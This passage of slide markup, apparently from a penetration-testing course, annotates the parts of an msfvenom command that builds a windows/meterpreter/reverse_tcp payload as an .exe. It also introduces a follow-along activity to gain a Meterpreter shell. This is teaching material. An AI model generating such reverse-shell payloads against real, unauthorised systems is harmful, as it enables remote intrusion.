                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="580" name="Google Shape;580;p76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1276200" y="1550250"/>
            <a:ext cx="1703700" cy="226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a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>-p</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>indicates payload.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="581" name="Google Shape;581;p76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="5400000">
            <a:off x="1314050" y="1778150"/>
            <a:ext cx="105600" cy="282900"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="582" name="Google Shape;582;p76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1775925" y="3304325"/>
            <a:ext cx="2785500" cy="456000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>windows/meterpreter/reverse_tcp</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:highlight>
                <a:schemeClr val="accent1"/>
              </a:highlight>
              <a:latin typeface="Inconsolata"/>
              <a:ea typeface="Inconsolata"/>
              <a:cs typeface="Inconsolata"/>
              <a:sym typeface="Inconsolata"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>s the Metasploit command module.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="583" name="Google Shape;583;p76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="2895975" y="1603050"/>
            <a:ext cx="88200" cy="2749500"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="774725" y="2580600"/>
            <a:ext cx="85800" cy="796800"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6989175" y="3304325"/>
            <a:ext cx="1854900" cy="533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a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent3"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>-f exe</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="00FFFF"/>
                </a:highlight>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="00FFFF"/>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chemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>creates a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> file type.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="586" name="Google Shape;586;p76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="7187425" y="2778900"/>
            <a:ext cx="105600" cy="380400"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">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5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="587" name="Google Shape;587;p76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="463725" y="3304325"/>
            <a:ext cx="920700" cy="707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a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="accent1"/>
                </a:highlight>
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:highlight>
                <a:schemeClr val="accent1"/>
              </a:highlight>
              <a:latin typeface="Inconsolata"/>
              <a:ea typeface="Inconsolata"/>
              <a:cs typeface="Inconsolata"/>
              <a:sym typeface="Inconsolata"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>launches the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Inconsolata Medium"/>
                <a:ea typeface="Inconsolata Medium"/>
                <a:cs typeface="Inconsolata Medium"/>
                <a:sym typeface="Inconsolata Medium"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1200">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> program.</a:t>
            </a:r>
            <a:endParaRPr sz="12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91" name="Shape 591"/>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78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4398800"/>
            <a:ext cx="8703600" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>20 minutes</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="597" name="Google Shape;597;p78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1726975"/>
            <a:ext cx="6185100" cy="21162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800"/>
              <a:t>In this activity, we’ll generate a custom payload with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:latin typeface="Inconsolata ExtraBold"/>
                <a:ea typeface="Inconsolata ExtraBold"/>
                <a:cs typeface="Inconsolata ExtraBold"/>
                <a:sym typeface="Inconsolata ExtraBold"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t> and use it to gain a Meterpreter shell.</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>Note: We’ll complete this as a follow-along activity. </a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="598" name="Google Shape;598;p78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-6000" y="478650"/>
            <a:ext cx="9168600" cy="3231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b="1" lang="en" sz="1800">
                <a:latin typeface="Inconsolata"/>
                <a:ea typeface="Inconsolata"/>
                <a:cs typeface="Inconsolata"/>
                <a:sym typeface="Inconsolata"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:latin typeface="Inconsolata"/>
              <a:ea typeface="Inconsolata"/>
              <a:cs typeface="Inconsolata"/>
              <a:sym typeface="Inconsolat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606" name="Shape 606"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="607" name="Google Shape;607;p80"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix amt="12000"/>
          </a:blip>
          <a:srcRect b="21874" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6504875" y="3069475"/>
            <a:ext cx="2639125" cy="2074025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="608" name="Google Shape;608;p80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2541900"/>
            <a:ext cx="9144000" cy="7407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solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Meterpreter</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="609" name="Google Shape;609;p80"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4218608" y="1840596"/>
            <a:ext cx="706789" cy="805738"/>
            <a:chOff x="1564800" y="297975"/>
            <a:chExt cx="4490400" cy="5119050"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="610" name="Google Shape;610;p80"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1564800" y="297975"/>
              <a:ext cx="4490400" cy="5119050"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="204762" w="179616">
                  <a:moveTo>
                    <a:pt x="128126" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="179615" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="179615" y="114555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="179615" y="114555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="179615" y="121340"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178817" y="127727"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178019" y="134113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="176821" y="139701"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="175225" y="145289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="173229" y="150478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170834" y="155267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168439" y="160057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="166044" y="164448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="162851" y="168439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="160057" y="172031"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156864" y="175624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="153272" y="178817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="149679" y="182010"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142495" y="187598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134911" y="191989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127327" y="195581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119744" y="198774"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="112559" y="200770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105774" y="202765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99387" y="203564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="94199" y="204362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89808" y="204761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89808" y="204761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85417" y="204362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="80229" y="203564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73842" y="202765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="67057" y="200770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59872" y="198774"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52289" y="195581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44705" y="191989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37121" y="187598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29937" y="182010"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26344" y="178817"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23151" y="175624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19559" y="172031"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16765" y="168439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13572" y="164448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11177" y="160057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8782" y="155267"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6387" y="150478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4391" y="145289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2795" y="139701"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1597" y="134113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="799" y="127727"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="121340"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="114555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="51490" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="51490" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="128126" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="128126" y="1"/>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80"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2013850" y="737050"/>
              <a:ext cx="3612275" cy="3512475"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="140499" w="144491">
                  <a:moveTo>
                    <a:pt x="72245" y="104176"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="93799" y="104176"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93799" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93799" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113756" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113756" y="140498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129323" y="140498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129323" y="140498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="130121" y="140099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="131717" y="138902"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134112" y="136507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136906" y="132516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138503" y="129722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="139700" y="126528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="141297" y="123335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142095" y="118945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="143293" y="114554"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144091" y="109365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144490" y="103378"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144490" y="96992"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144490" y="96992"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="144490" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113756" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72245" y="25545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30734" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="96992"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="96992"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="103378"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="399" y="109365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1198" y="114554"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2395" y="118945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3593" y="123335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4790" y="126528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5987" y="129722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7584" y="132516"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10378" y="136507"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12773" y="138902"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14369" y="140099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15168" y="140498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30734" y="140498"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30734" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30734" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50691" y="56279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50691" y="104176"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72245" y="104176"/>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5" name="Shape 615"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="616" name="Google Shape;616;p81"/>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Meterpreter</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="617" name="Google Shape;617;p81"/>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618" name="Google Shape;618;p81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8813400" cy="728100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="95000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Using Meterpreter is similar to using a normal shell, but it has built-in commands and pen testing features. Think of it as an extendable command shell that provides the same interface across platforms.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="619" name="Google Shape;619;p81"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1504000" y="1808900"/>
            <a:ext cx="6025075" cy="300452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3" name="Shape 623"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
